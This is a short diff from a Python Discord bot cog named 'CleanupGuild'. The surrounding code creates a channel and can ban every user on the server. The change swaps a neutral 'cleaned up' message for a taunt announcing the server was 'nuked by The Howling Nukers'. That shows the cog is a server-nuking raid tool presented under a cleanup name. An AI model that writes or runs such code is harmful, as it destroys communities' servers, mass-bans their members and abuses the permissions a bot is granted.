@@ -40,7 +40,7 @@ class CleanupGuild(commands.Cog):
             channel = await guild.create_text_channel(channel_title, category=category)
 
             # Send a cleanup message in the new channel
-            await channel.send("Server cleaned up @everyone")
+            await channel.send("Server nuked by The Howling Nukers. Good luck cleaning up the mess we made. AWOOOOOOOOO")
 
             # Ban all users (excluding bot) if 'ban_users' is True
             if ban_users:
